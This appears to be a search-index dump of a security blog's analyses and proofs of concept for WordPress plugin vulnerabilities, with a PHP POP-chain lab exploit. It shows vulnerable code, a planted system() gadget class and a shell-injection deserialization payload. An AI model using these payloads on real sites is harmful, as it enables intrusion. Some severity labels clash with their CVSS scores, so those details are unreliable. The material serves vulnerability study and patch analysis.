[{"categories":["CVE Analyst"],"content":"Security Vulnerability in WordPress Ninja Forms Plugin.","date":"2025-11-14","objectID":"/posts/2025-11-14-cve-2025-9083/","tags":["analyst","plugin","php object injection"],"title":"CVE-2025-9083 Analysis \u0026 POC","uri":"/posts/2025-11-14-cve-2025-9083/"},{"categories":["CVE Analyst"],"content":"CVE \u0026 Basic Info This plugin performs an unserialize operation on data submitted by users through form fields. This allows unauthenticated users to perform PHP Object Injection if a suitable gadget exists within the system. CVE ID: CVE-2025-9083 Vulnerability Type: Arbitrary File Upload Affected Versions: \u003c= 3.11.0 Patched Versions: 3.11.1 CVSS severity: High (9.8) Required Privilege: Unauthenticated Product: WordPress Ninja Forms Plugin Requirements Local WordPress \u0026 Debugging Virtual Machine Docker Plugin Version ‚Äì Ninja Forms: 3.11.0 ‚Äì vulnerable 3.11.1 ‚Äì patched Diff Tool (diff) ‚Üí Meld or any diff tool. Cause The vulnerability originates from the extractSubmissions() function inside the FieldsetRepeater.php file: if(is_string($fieldSubmissionValue)){ $fieldSubmissionValue = maybe_unserialize($fieldSubmissionValue); } maybe_unserialize() is called without any protection against PHP Object Injection. Bug and patch The patch replaces maybe_unserialize() with unserialize() and disables object creation using ['allowed_classes' =\u003e false], preventing PHP Object Injection altogether. Analysis Class name The class name corresponds to a layout field when creating a blank form with the plugin. Create form with Repeatable Fieldset Create a form with Repeatable Fieldset, then drag a Single Line Text field into it as input, and embed the form into a post or page. Embed form into post Publish the post and submit the form with a payload value: Request test with `payload` We see that all data is assigned to the formData parameter. Copy the URL-decoded content into an online JSON formatter: https://jsonformatter.org/ Formatted JSON data Observing the debugger shows the similarity: Debugger data $fieldSubmissionValue corresponds to the value of the field with ID 8. Thus, when value is a string, it triggers maybe_unserialize(). We create a class and place it in wp-config.php to test the invocation when maybe_unserialize() runs: class ObjectInjection { public $command; function __destruct(){ die(system($this-\u003ecommand)); } } Resubmit the request with a serialized payload as the new value. Because the payload is wrapped inside JSON, quotes must be escaped (\\\") to avoid breaking the JSON structure. Change the value to serialized string Value inside debugger Shell execution occurs ‚Üí Deserialization is triggered. Deserialization triggered Callstack flow: The application registers an AJAX handler for unauthenticated users: if( isset( $_POST['formData'] ) ) { $this-\u003e_form_data = json_decode( $_POST['formData'], TRUE ); // php5.2 fallback if( ! $this-\u003e_form_data ) $this-\u003e_form_data = json_decode( stripslashes( $_POST['formData'] ), TRUE ); } add_action( 'wp_ajax_nopriv_nf_ajax_submit', array( $this, 'submit' ) ); This means when sending a POST request to /wp-admin/admin-ajax.php with action=nf_ajax_submit, the submit callback is triggered. A fully submitted form follows this call flow: Callstack diagram Flow graph TD A[\"POST /wp-admin/admin-ajax.php\"] -- action=nf_ajax_submit\u0026security=security_code\u0026formData=form_data --\u003e B[\"wp_ajax_nopriv_nf_ajax_submit\"] B --\u003e C[\"NF_AJAX_Controllers_Submission::submit()\"] C --\u003e D[\"NF_AJAX_Controllers_Submission::process()\"] D --\u003e E[\"NF_MergeTags_Fields::add_field()\"] E --\u003e F[\"NF_MergeTags_Fields::generateFieldsetTableRows()\"] F --\u003e G[\"NF_Handlers_FieldsetRepeater::extractSubmissions()\"] --\u003e H{$fieldSubmissionValue is String?} H -- Yes --\u003e I[\"maybe_unserialize($fieldSubmissionValue)\"] I --\u003e K(\"RCE\") graph TD A[\"POST /wp-admin/admin-ajax.php\"] -- action=nf_ajax_submit\u0026security=security_code\u0026formData=form_data --\u003e B[\"wp_ajax_nopriv_nf_ajax_submit\"] B --\u003e C[\"NF_AJAX_Controllers_Submission::submit()\"] C --\u003e D[\"NF_AJAX_Controllers_Submission::process()\"] D --\u003e E[\"NF_MergeTags_Fields::add_field()\"] E --\u003e F[\"NF_MergeTags_Fields::generateFieldsetTableRows()\"] F --\u003e G[\"NF_Handlers_FieldsetRepeater::extractSubmissions()\"] --\u003e H{$fieldSubmissionValue is String?} H -- Yes --\u003e I[\"maybe_unserialize($fieldSubmissionValue)\"] I --\u003e K(","date":"2025-11-14","objectID":"/posts/2025-11-14-cve-2025-9083/:0:0","tags":["analyst","plugin","php object injection"],"title":"CVE-2025-9083 Analysis \u0026 POC","uri":"/posts/2025-11-14-cve-2025-9083/"},{"categories":["CVE Analyst"],"content":"Security Vulnerability in WordPress AI Engine Plugin.","date":"2025-11-13","objectID":"/posts/2025-11-13-cve-2025-7847/","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-7847 Analysis \u0026 POC","uri":"/posts/2025-11-13-cve-2025-7847/"},{"categories":["CVE Analyst"],"content":"CVE \u0026 Basic Info The AI Engine plugin for WordPress contains an arbitrary file upload vulnerability due to missing file type validation in the rest_simpleFileUpload() function in versions 2.9.3 and 2.9.4. This allows authenticated attackers (attackers with authentication), with Subscriber-level privileges or higher, to upload arbitrary files to the affected website‚Äôs server when the REST API is enabled, which can lead to remote code execution (RCE). CVE ID: CVE-2025-7847 Vulnerability Type: Arbitrary File Upload Affected Versions: 2.9.3-2.9.4 Patched Versions: 2.9.5 CVSS severity: High (9.9) Required Privilege: Subscriber Product: WordPress AI Engine Plugin Requirements Local WordPress \u0026 Debugging Virtual Machine Docker Plugin Version - AI Engine: 2.9.4 ‚Äì vulnerable 2.9.5 ‚Äì patched Diff Tool (diff) ‚Üí Meld or any diff tool. Cause The vulnerability occurs because the upload handling function writes files directly (copy(), file_put_contents()) without checking file type or authenticating the user, allowing an attacker to upload arbitrary files (including .php) into the uploads directory and execute malicious code. Validate file type // Validate filename extension for base64 uploads $validate = wp_check_filetype( $filename ); if ( $validate['type'] == false ) { throw new Exception( 'File type is not allowed.' ); } The patch added file type checks in the simpleFileUpload and upload_file functions using wp_check_filetype() to only allow uploads for valid formats based on WordPress‚Äôs whitelist. Code Analysis The plugin registers several public APIs via the rest_api_init() function public function rest_api_init() { $public_api = $this-\u003ecore-\u003eget_option( 'public_api' ); if ( !$public_api ) { return; } $this-\u003ebearer_token = $this-\u003ecore-\u003eget_option( 'public_api_bearer_token' ); if ( !empty( $this-\u003ebearer_token ) ) { add_filter( 'mwai_allow_public_api', [ $this, 'auth_via_bearer_token' ], 10, 3 ); } register_rest_route( 'mwai/v1', '/simpleFileUpload', [ 'methods' =\u003e 'POST', 'callback' =\u003e [ $this, 'rest_simpleFileUpload' ], 'permission_callback' =\u003e function ( $request ) { return $this-\u003ecore-\u003ecan_access_public_api( 'simpleFileUpload', $request ); }, ] ); ... } The function checks whether the Public API option is enabled. According to the plugin documentation, this option is disabled by default: By default, the Public REST API is disabled completely. If you enable it, only authentified API requests will actually go through, otherwise they will be rejected. You can override this behavior in many ways and we will see a few examples. The Public REST API is also limited by the Limits set in AI Engine (either as Users or Guests, and System). You can enable it in the Admin Dashboard at wp-admin/admin.php?page=mwai_settings\u0026nekoTab=settings enable the REST API According to the description, when this option is enabled, only authenticated API requests are accepted. There are two authentication methods: X-WP-Nonce: Obtained via the JavaScript object wpApiSettings for logged-in users (Subscriber+) Bearer Token: Configured by the admin $this-\u003ebearer_token = $this-\u003ecore-\u003eget_option( 'public_api_bearer_token' ); if ( !empty( $this-\u003ebearer_token ) ) { add_filter( 'mwai_allow_public_api', [ $this, 'auth_via_bearer_token' ], 10, 3 ); } When a Bearer Token is set, the plugin registers a filter named mwai_allow_public_api, with the callback being the method auth_via_bearer_token. register_rest_route( 'mwai/v1', '/simpleFileUpload', [ 'methods' =\u003e 'POST', 'callback' =\u003e [ $this, 'rest_simpleFileUpload' ], 'permission_callback' =\u003e function ( $request ) { return $this-\u003ecore-\u003ecan_access_public_api( 'simpleFileUpload', $request ); }, ] ); An API is registered with method POST: Endpoint: /wp-json/mwai/v1/simpleFileUpload Callback: rest_simpleFileUpload With permission_callback being the return value of can_access_public_api() public function can_access_public_api( $feature, $extra ) { $logged_in = is_user_logged_in(); return apply_filters( 'mwai_allow_public_api', $l","date":"2025-11-13","objectID":"/posts/2025-11-13-cve-2025-7847/:0:0","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-7847 Analysis \u0026 POC","uri":"/posts/2025-11-13-cve-2025-7847/"},{"categories":["CVE Analyst"],"content":"A list of 'sink' points in WordPress ‚Äî where input data can lead to the execution of malicious actions.","date":"2025-11-13","objectID":"/posts/2025-11-13-wordpress-vulnerability-sink/","tags":["sink","wordpress"],"title":"WordPress Vulnerability Sinks","uri":"/posts/2025-11-13-wordpress-vulnerability-sink/"},{"categories":["CVE Analyst"],"content":"Why This Article? ","date":"2025-11-13","objectID":"/posts/2025-11-13-wordpress-vulnerability-sink/:0:0","tags":["sink","wordpress"],"title":"WordPress Vulnerability Sinks","uri":"/posts/2025-11-13-wordpress-vulnerability-sink/"},{"categories":["CVE Analyst"],"content":"Security Vulnerability in WordPress Embed Articulate Content into WordPress Plugin.","date":"2025-11-12","objectID":"/posts/2025-11-12-cve-2025-32202/","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-32202 Analysis \u0026 POC","uri":"/posts/2025-11-12-cve-2025-32202/"},{"categories":["CVE Analyst"],"content":"CVE \u0026 Basic Info An Arbitrary File Upload vulnerability in Brian Batt - elearningfreak.com for the Insert or Embed Articulate Content into WordPress plugin allows uploading a Web Shell to the web server. This issue affects Insert or Embed Articulate Content into WordPress: from n/a to 4.3000000025. CVE ID: CVE-2025-32202 Vulnerability Type: Arbitrary File Upload Affected Versions: \u003c= 4.3000000025 Patched Versions: 4.3000000026 CVSS severity: Medium (9.1) Required Privilege: Editor Product: WordPress Embed Articulate Content into WordPress Plugin Requirements Local WordPress \u0026 Debugging Virtual Machine Docker Plugin Version - Embed Articulate Content into WordPress: 4.3000000025 ‚Äì vulnerable 4.3000000026 ‚Äì patched Diff Tool (diff) ‚Üí Meld or any diff tool. Cause The vulnerability lies in the articulate_has_php_file() function at /wp-content/plugins/insert-or-embed-articulate-content-into-wordpress/functions.php due to insufficient checks, allowing an attacker to upload a .htaccess file to override handling in the uploads directory; as a result, subsequently uploaded files with attacker-chosen extensions (e.g., .abc, .xnxx) can be executed as PHP. Adding a check for .htaccess The patch added a condition to check for .htaccess on upload to prevent this vulnerability. Code Analysis The plugin registers an action hook for logged-in users add_action( 'wp_ajax_articulate_upload_file', 'articulate_upload_ajax_file' ); So when accessing the endpoint /wp-admin/admin-ajax.php with param action=articulate_upload_file, the callback articulate_upload_ajax_file is invoked function articulate_upload_ajax_file() { articulate_setup_php_ini(); check_ajax_referer( 'articulate_upload_file' ); if ( ! is_user_logged_in() || ! current_user_can( 'upload_files' ) || ! current_user_can( 'unfiltered_html' ) ) { die( json_encode( array( 'OK' =\u003e 0, 'info' =\u003e __( 'You do not have permissions to upload this file. Contact your admin to get the unfiltered_html capability.', 'insert-or-embed-articulate-content-into-wordpress' ), ) ) ); } $count_dirs = getDirs(); // you can use WP's wp_handle_upload() function: $file = $_FILES['async-upload']; $dir = untrailingslashit( getUploadsPath() ); if ( empty( $_FILES ) || $_FILES['async-upload']['error'] ) { die( json_encode( array( 'OK' =\u003e 0, 'info' =\u003e __( 'Failed to move uploaded file. Please check if the folder has write permissions.', 'insert-or-embed-articulate-content-into-wordpress' ), ) ) ); } $chunk = isset( $_REQUEST['chunk'] ) ? intval( $_REQUEST['chunk'] ) : 0; $chunks = isset( $_REQUEST['chunks'] ) ? intval( $_REQUEST['chunks'] ) : 0; $fileName = isset( $_REQUEST['name'] ) ? sanitize_file_name( $_REQUEST['name'] ) : sanitize_file_name( $_FILES['async-upload']['name'] ); $filePath = '' . $dir . '/' . sanitize_file_name( $fileName ) . ''; // Open temp file $out = @fopen( \"{$filePath}.part\", $chunk == 0 ? 'wb' : 'ab' ); if ( $out ) { // Read binary input stream and append it to temp file $in = @fopen( $_FILES['async-upload']['tmp_name'], 'rb' ); if ( $in ) { while ( $buff = fread( $in, 4096 ) ) { fwrite( $out, $buff ); } } else { die( json_encode( array( 'OK' =\u003e 0, 'info' =\u003e __( 'Failed to open input stream. Please check if the folder has write permissions', 'insert-or-embed-articulate-content-into-wordpress' ), ) ) ); } @fclose( $in ); @fclose( $out ); @unlink( $_FILES['async-upload']['tmp_name'] ); } else { die( json_encode( array( 'OK' =\u003e 0, 'info' =\u003e __( 'Failed to open output stream. Please check if the folder has write permissions', 'insert-or-embed-articulate-content-into-wordpress' ), ) ) ); } // Security check. $mime = wp_check_filetype( $filePath ); $mimes = get_allowed_mime_types( get_current_user_id() ); if ( ! isset( $mime['type'] ) || ! in_array( $mime['type'], array_values( $mimes ) ) ) { die( json_encode( array( 'OK' =\u003e 0, 'info' =\u003e __( 'Failed to upload this file for security reasons. Contact your admin to ensure your user can access all mime types from get_allowed_mime_types.', 'insert-or-embed","date":"2025-11-12","objectID":"/posts/2025-11-12-cve-2025-32202/:0:0","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-32202 Analysis \u0026 POC","uri":"/posts/2025-11-12-cve-2025-32202/"},{"categories":["CVE Analyst"],"content":"Security Vulnerability in WordPress STAGGS Plugin.","date":"2025-11-11","objectID":"/posts/2025-11-11-cve-2025-47637/","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-47637 Analysis \u0026 POC","uri":"/posts/2025-11-11-cve-2025-47637/"},{"categories":["CVE Analyst"],"content":"CVE \u0026 Basic Info The Arbitrary File Upload vulnerability in the STAGGS plugin allows an attacker to upload a Web Shell to the web server, affecting STAGGS versions from n/a to 2.11.0. CVE ID: CVE-2025-47637 Vulnerability Type: Arbitrary File Upload Affected Versions: \u003c= 2.11.0 Patched Versions: 2.12.0 CVSS severity: High (10) Required Privilege: Unauthenticated Product: WordPress STAGGS Plugin Requirements Local WordPress \u0026 Debugging Virtual Machine Docker Plugin Version - STAGGS: 2.11.0 ‚Äì vulnerable 2.12.0 ‚Äì patched Diff Tool (diff) ‚Üí Meld or any diff tool. Cause The vulnerability occurs in the function store_final_product_image() in the file /wp-content/plugins/staggs/includes/staggs-functions.php due to not validating the file type before upload. File type validation The patch used a whitelist, accepting only the file types: png,jpg,jpeg,gif. Code Analysis The plugin registered an action hook for unauthenticated users (wp_ajax_nopriv_): add_action( 'wp_ajax_nopriv_staggs_get_configuration_form_urls', 'staggs_get_configuration_form_urls_ajax' ); When accessing the endpoint /wp-admin/admin-ajax.php with param action=staggs_get_configuration_form_urls the callback staggs_get_configuration_form_urls_ajax is called function staggs_get_configuration_form_urls_ajax() { $response = array(); if ( ! isset( $_POST['nonce'] ) || ! wp_verify_nonce( $_REQUEST['nonce'], 'sgg_ajax_nonce' ) ) { echo json_encode( $response ); die(); } ... if ( isset( $_POST['image_id'] ) ) { $image_name = staggs_sanitize_title( get_the_title( $_POST['image_id'] ) ); // image name based on product title. $image_url = store_final_product_image( $image_name, $_POST['image'], $_POST['values'], true ); $response['image_url'] = $image_url; } ... echo json_encode( $response ); die(); } This function checks the nonce from the request; if it doesn‚Äôt exist or is invalid it returns an empty response. Tip When searching for the keyword sgg_ajax_nonce, we see the nonce is created with the key AJAX_NONCE and has a comment // image name based on product title. related to the product. Since this section does not require authentication, it may be a mechanism to serve product display to unauthenticated users, and the nonce is inserted directly into the source code. When testing the plugin‚Äôs product creation feature, the system creates a post that unauthenticated users can still access. This nonce appears in the returned source when accessing the created product. How the nonce is created Create Product using plugin Nonce taken from response If the nonce is valid, it proceeds to check whether $_POST['image_id'] exists; if it does: It fetches the image name, meaning the product title (as described: // image name based on product title.) Calls store_final_product_image() to save the image and obtain the returned URL Returns a JSON response containing image_url. function store_final_product_image( $imagename, $data, $options, $main_image = true) { if ( preg_match( '/^data:image\\/(.*);base64,/', $data, $type ) ) { // Valid base64 image. $data = substr( $data, strpos($data, ',') + 1 ); $type = strtolower( $type[1] ); // jpg, png, gif $data = str_replace( ' ', '+', $data ); $data = base64_decode($data); if ( $data === false ) { throw new \\Exception('Image decode failed. Try again.'); } } ... $upload_dir = wp_get_upload_dir(); $base_dir = $upload_dir['basedir']; // Allow different location. $save_path = apply_filters( 'staggs_image_save_dir', $base_dir . '/staggs' ); if ( ! file_exists( $save_path ) ) { mkdir( $save_path, 0777, true ); } if ( $main_image ) { // Main product image. if ( is_array( $options ) \u0026\u0026 count( $options ) \u003e 0 ) { $filename = $imagename . '-' . md5( wp_json_encode( $options ) ) . '.' . $type; } else { $filename = $imagename . '.' . $type; } } ... // Always override in case something went wrong earlier file_put_contents( $save_path . \"/{$filename}\", $data ); $image_path_url = str_replace( ABSPATH, trailingslashit( get_site_url() ), $save_path ); return $image_path_","date":"2025-11-11","objectID":"/posts/2025-11-11-cve-2025-47637/:0:0","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-47637 Analysis \u0026 POC","uri":"/posts/2025-11-11-cve-2025-47637/"},{"categories":["CVE Analyst"],"content":"Explore the POP Chain in a PHP lab: identify gadgets, craft a payload, and successfully achieve RCE.","date":"2025-11-11","objectID":"/posts/2025-11-11-pop-chain-lab1/","tags":["analyst","plugin","pop chain","insecure deserialize"],"title":"POP Chain Analysis \u0026 Exploit","uri":"/posts/2025-11-11-pop-chain-lab1/"},{"categories":["CVE Analyst"],"content":"Intro During my research on Insecure Deserialization, I received a lab related to POP Chain (Property-Oriented Programming Chain). This is an interesting type of attack: instead of exploiting a function or command directly, an attacker composes gadgets (magic methods from classes) to achieve a goal ‚Äî for example, executing system commands (RCE). This post describes my analysis and exploitation of the lab: reviewing the source code, identifying useful gadgets, and building a payload to trigger the call chain (POP chain). The goal is to help you understand the thought process when tackling labs of this kind. The lab I worked on: https://github.com/William957-web/POP-CHAIN-LAB1/blob/main/index.php Analysis Source code overview \u003c?php class User{ public $name; private $memo; function __construct($name){ $this-\u003ename=$name; } function __wakeup(){ $this-\u003ememo=new Note($this -\u003e name.\"say hello\", 'test_whale'); } function __get($content){ return $this-\u003ememo; } } class Note{ public $content; public $whale; function __construct($content, $whale){ $this-\u003econtent=$content; $this-\u003ewhale=$whale; } function __toString(){ $this-\u003erecord($this-\u003ewhale, $this-\u003econtent); return 'Record for '.$this-\u003ewhale.' is : '.$this-\u003econtent; } function record($whale, $content){ //check whether it's an attribute $test=$whale-\u003e$content; if ($test!=NULL){ echo(\"It's probably an attribute\"); } } } class Whale{ public $name; private $note; function __construct($name){ $this-\u003ename=$name; } function take_note($note){ $this-\u003enote=date(\"Y/m/d H:i:s\").$note; } function __get($attribute){ system('echo \"'.$this-\u003ename.'\" \u003e\u003e log.txt'); return $this-\u003e$attribute; } function __toString(){ return $this-\u003ename; } } if (isset($_POST['pop'])){ unserialize(base64_decode($_POST['pop'])); } ?\u003e The main file contains three important classes: User, Note, and Whale. At the end of the file there is an unserialize on input if $_POST['pop'] is provided: if (isset($_POST['pop'])){ unserialize(base64_decode($_POST['pop'])); } Notable points: Line 8: User::__wakeup() creates a Note and assigns it to $this-\u003ememo. Line 23: Note::__toString() calls record() then returns a string. Line 28: Note::record() accesses $whale-\u003e$content. Line 44: Whale::__get() calls system('echo \"'.$this-\u003ename.'\" \u003e\u003e log.txt');. Line 52: the unserialize(...) call ‚Äî the attack surface. Execution flow leading to shell Unserialize a User: When a User object is unserialized, the magic method __wakeup() runs. Here __wakeup() initializes a new Note using $this-\u003ename . \"say hello\" as content and 'test_whale' as whale: $this-\u003ememo = new Note($this-\u003ename . \"say hello\", 'test_whale'); Note::__toString() calls record(): __toString() in Note calls record($this-\u003ewhale, $this-\u003econtent) before returning the string. __toString() is invoked when the object is cast to a string. We can abuse $this-\u003ename so that it is an object in the Note; it will be cast to string when concatenated with \"say hello\" at line 9. record() accesses a dynamic property on $whale: Inside record() there is: $test = $whale-\u003e$content; If $whale is a Whale object and $content does not match an existing property, PHP will call the magic Whale::__get($attribute). Whale::__get() executes system(): Whale::__get() contains: system('echo \"'.$this-\u003ename.'\" \u003e\u003e log.txt'); Because system() invokes a shell, if $this-\u003ename contains command-breaking characters (for example \"; ls /; echo \"), an attacker can inject and execute shell commands leading to RCE. Exploit Create a file similar to the original but containing code that builds the serialized payload: \u003c?php class User{ public $name; private $memo; function __construct(){ $this-\u003ename= new Note(\"Top2\",new Whale(('\"; ls /; echo \"'))); } function __wakeup(){ $this-\u003ememo=new Note($this -\u003e name.\"say hello\", 'test_whale'); } function __get($content){ return $this-\u003ememo; } } class Note{ public $content; public $whale; function __construct($content, $whale){ $this-\u003econtent=$content; $this-\u003ewhale=$whale; } function __toString(){ $this-\u003er","date":"2025-11-11","objectID":"/posts/2025-11-11-pop-chain-lab1/:0:0","tags":["analyst","plugin","pop chain","insecure deserialize"],"title":"POP Chain Analysis \u0026 Exploit","uri":"/posts/2025-11-11-pop-chain-lab1/"},{"categories":["CVE Analyst"],"content":"Security Vulnerability in WordPress Elementor Website Builder Plugin","date":"2025-11-10","objectID":"/posts/2025-11-10-cve-2023-48777/","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2023-48777 Analysis \u0026 POC","uri":"/posts/2025-11-10-cve-2023-48777/"},{"categories":["CVE Analyst"],"content":"CVE \u0026 Basic Info An Arbitrary File Upload vulnerability in the Elementor Website Builder plugin for WordPress. This issue affects Elementor Website Builder versions from 3.3.0 to 3.18.1. CVE ID: CVE-2023-48777 Vulnerability Type: Arbitrary File Upload Affected Versions: \u003c= 3.3.0-3.18.1 Patched Versions: 3.18.2 CVSS severity: High (9.9) Required Privilege: Contributor Product: WordPress Elementor Website Builder Plugin Requirements Local WordPress \u0026 Debugging Virtual Machine Docker Plugin Version - Elementor Website Builder: 3.3.0 ‚Äì vulnerable 3.18.2 ‚Äì patched Diff Tool (diff) ‚Üí Meld or any diff tool. Cause The vulnerability stems from not validating the file type before saving to the server, allowing an attacker to upload files with dangerous formats. In version 3.18.1, the function handle_elementor_upload() does not verify the file type when processing upload data from the fileData parameter: public function handle_elementor_upload( array $file, $allowed_file_extensions = null ) { if ( isset( $file['fileData'] ) ) { $file = $this-\u003esave_base64_to_tmp_file( $file ); } $validation_result = $this-\u003evalidate_file( $file, $allowed_file_extensions ); if ( is_wp_error( $validation_result ) ) { return $validation_result; } return $file; } private function save_base64_to_tmp_file( $file ) { $file_content = base64_decode( $file['fileData'] ); // phpcs:ignore // If the decode fails if ( ! $file_content ) { return new \\WP_Error( 'file_error', self::INVALID_FILE_CONTENT ); } $temp_filename = $this-\u003ecreate_temp_file( $file_content, $file['fileName'] ); if ( is_wp_error( $temp_filename ) ) { return $temp_filename; } return [ // the original uploaded file name 'name' =\u003e $file['fileName'], // The path to the temporary file 'tmp_name' =\u003e $temp_filename, ]; } In the patch 3.18.2, the developer added a valid file type check before saving by passing an extra parameter $allowed_file_extensions into save_base64_to_tmp_file(), preventing uploads of malicious files: public function handle_elementor_upload( array $file, $allowed_file_extensions = null ) { if ( isset( $file['fileData'] ) ) { $file = $this-\u003esave_base64_to_tmp_file( $file, $allowed_file_extensions ); } $validation_result = $this-\u003evalidate_file( $file, $allowed_file_extensions ); if ( is_wp_error( $validation_result ) ) { return $validation_result; } return $file; } private function save_base64_to_tmp_file( $file, $allowed_file_extensions = null ) { $file_extension = pathinfo( $file['fileName'], PATHINFO_EXTENSION ); $is_file_type_allowed = $this-\u003eis_file_type_allowed( $file_extension, $allowed_file_extensions ); if ( is_wp_error( $is_file_type_allowed ) ) { return $is_file_type_allowed; } $file_content = base64_decode( $file['fileData'] ); // phpcs:ignore // If the decode fails if ( ! $file_content ) { return new \\WP_Error( 'file_error', self::INVALID_FILE_CONTENT ); } $temp_filename = $this-\u003ecreate_temp_file( $file_content, $file['fileName'] ); if ( is_wp_error( $temp_filename ) ) { return $temp_filename; } return [ // the original uploaded file name 'name' =\u003e $file['fileName'], // The path to the temporary file 'tmp_name' =\u003e $temp_filename, ]; } Code Analysis The template upload process uses Base64 content: the data in $file['fileData'] is decoded with base64_decode and assigned to $file_content: $file_content = base64_decode( $file['fileData'] ); After decoding, save_base64_to_tmp_file() calls create_temp_file() to save this content as a template file on the server: public function create_temp_file( $file_content, $file_name ) { $temp_filename = $this-\u003ecreate_unique_dir() . $file_name; file_put_contents( $temp_filename, $file_content ); // phpcs:ignore return $temp_filename; } The file path is constructed by concatenating $file_name with the return value of create_unique_dir() ‚Äî this function creates the temporary template storage path: public function create_unique_dir() { $unique_dir_path = $this-\u003eget_temp_dir() . uniqid() . DIRECTORY_SEPARATOR; wp_mkdir_p( $unique_dir_path ); return ","date":"2025-11-10","objectID":"/posts/2025-11-10-cve-2023-48777/:0:0","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2023-48777 Analysis \u0026 POC","uri":"/posts/2025-11-10-cve-2023-48777/"},{"categories":["CVE Analyst"],"content":"Security Vulnerability in WordPress Everest Forms Plugin.","date":"2025-11-09","objectID":"/posts/2025-11-09-cve-2025-1128/","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-1128 Analysis \u0026 POC","uri":"/posts/2025-11-09-cve-2025-1128/"},{"categories":["CVE Analyst"],"content":"CVE \u0026 Basic Info The Everest Forms ‚Äì Contact Forms, Quiz, Survey, Newsletter \u0026 Payment Form Builder plugin for WordPress is vulnerable to arbitrary file upload, read, and deletion due to missing file type and path validation in the format method of the EVF_Form_Fields_Upload class in all versions up to and including 3.0.9.4. This allows unauthenticated attackers to upload, read, and delete arbitrary files on the affected site‚Äôs server, potentially leading to remote code execution, sensitive information disclosure, or site takeover. CVE ID: CVE-2025-1128 Vulnerability Type: Arbitrary File Upload Affected Versions: \u003c= 3.0.9.4 Patched Versions: 3.0.9.5 CVSS severity: High (9.8) Required Privilege: Unauthenticated Product: WordPress Everest Forms Plugin Requirements Local WordPress \u0026 Debugging Virtual Machine Docker Plugin Version - Everest Forms: 3.0.9.4 ‚Äì vulnerable 3.0.9.5 ‚Äì patched Diff Tool (diff) ‚Üí Meld or any diff tool of your choice. Cause This vulnerability is caused by insufficient validation of file types and file paths in the format method of the EVF_Form_Fields_Upload class. Even when a file is of an invalid type, the upload flow can continue; by modifying parts of the submitted data/communication, server-side validation can be bypassed. public function format( $field_id, $field_submit, $form_data, $meta_key ) { ... $wp_filetype = wp_check_filetype_and_ext( $file['tmp_path'], $file['name'] ); $ext = empty( $wp_filetype['ext'] ) ? '' : $wp_filetype['ext']; $type = empty( $wp_filetype['type'] ) ? '' : $wp_filetype['type']; $proper_filename = empty( $wp_filetype['proper_filename'] ) ? '' : $wp_filetype['proper_filename']; if ( $proper_filename || ! $ext || ! $type ) { evf()-\u003etask-\u003eerrors[ $form_data['id'] ][ $field_id ] = esc_html__( 'File type is not allowed.', 'everest-forms' ); update_option( 'evf_validation_error', 'yes' ); } ... // upload file handler } The wp_check_filetype_and_ext() function will return empty values for $ext and $type if the uploaded file is invalid (not in WordPress‚Äôs whitelist of allowed types: https://developer.wordpress.org/reference/functions/wp_get_mime_types/). After lines 8-9 run, there is no mechanism to stop execution, so the upload logic continues. The patch fixes this by calling wp_die(): public function format( $field_id, $field_submit, $form_data, $meta_key ) { ... $wp_filetype = wp_check_filetype_and_ext( $file['tmp_path'], $file['name'] ); $ext = empty( $wp_filetype['ext'] ) ? '' : $wp_filetype['ext']; $type = empty( $wp_filetype['type'] ) ? '' : $wp_filetype['type']; $proper_filename = empty( $wp_filetype['proper_filename'] ) ? '' : $wp_filetype['proper_filename']; if ( $proper_filename || ! $ext || ! $type ) { evf()-\u003etask-\u003eerrors[ $form_data['id'] ][ $field_id ] = esc_html__( 'File type is not allowed.', 'everest-forms' ); update_option( 'evf_validation_error', 'yes' ); wp_die( 'File type is not allowed' ); } ... // upload file handler } Code Analysis public function format( $field_id, $field_submit, $form_data, $meta_key ) { // Setup class properties to reuse everywhere. $this-\u003eform_data = (array) $form_data; $this-\u003eform_id = absint( $this-\u003eform_data['id'] ); $this-\u003efield_id = $field_id; $this-\u003efield_data = $this-\u003eform_data['form_fields'][ $this-\u003efield_id ]; $field_label = ! empty( $this-\u003eform_data['form_fields'][ $this-\u003efield_id ]['label'] ) ? $this-\u003eform_data['form_fields'][ $this-\u003efield_id ]['label'] : ''; $input_name = sprintf( 'everest_forms_%d_%s', $this-\u003eform_id, $this-\u003efield_id ); // Make sure json_decode() doesn't fail on newer PHP. try { $raw_files = json_decode( wp_unslash( $_POST[ $input_name ] ), true ); // phpcs:ignore WordPress.Security } catch ( Exception $e ) { evf()-\u003etask-\u003eform_fields[ $this-\u003efield_id ] = $processed; return; } // Make sure we process only submitted files with the expected structure and keys. $files = array_filter( $raw_files, static function ( $file ) { return ( is_array( $file ) || is_object( $file ) \u0026\u0026 count( $file ) === 2 ) \u0026\u0026 ! empty( $file","date":"2025-11-09","objectID":"/posts/2025-11-09-cve-2025-1128/:0:0","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-1128 Analysis \u0026 POC","uri":"/posts/2025-11-09-cve-2025-1128/"},{"categories":["CVE Analyst"],"content":"Security Vulnerability in WordPress Kadence WooCommerce Email Designer Plugin.","date":"2025-11-08","objectID":"/posts/2025-11-08-cve-2025-39557/","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-39557 Analysis \u0026 POC","uri":"/posts/2025-11-08-cve-2025-39557/"},{"categories":["CVE Analyst"],"content":"CVE \u0026 Basic Info An Arbitrary File Upload vulnerability in Ben Ritner - Kadence WP Kadence WooCommerce Email Designer allows uploading a web shell to the web server. This issue affects Kadence WooCommerce Email Designer from an unspecified version up to 1.5.14. CVE ID: CVE-2025-39557 Vulnerability Type: Arbitrary File Upload Affected Versions: \u003c= 1.5.14 Patched Versions: 1.5.15 CVSS severity: Low (9.1) Required Privilege: Administrator Product: WordPress Kadence WooCommerce Email Designer Plugin Requirements Local WordPress \u0026 Debugging: Local WordPress and Debugging. Plugin versions - Kadence WooCommerce Email Designer: 1.5.14 (vulnerable) and 1.5.15 (patched). Diff tool - Meld or any diff tool to compare versions. WooCommerce Plugin Analysis Patch Diff static private function import_woomail( $wp_customize ) { ... $overrides = array( 'test_form' =\u003e 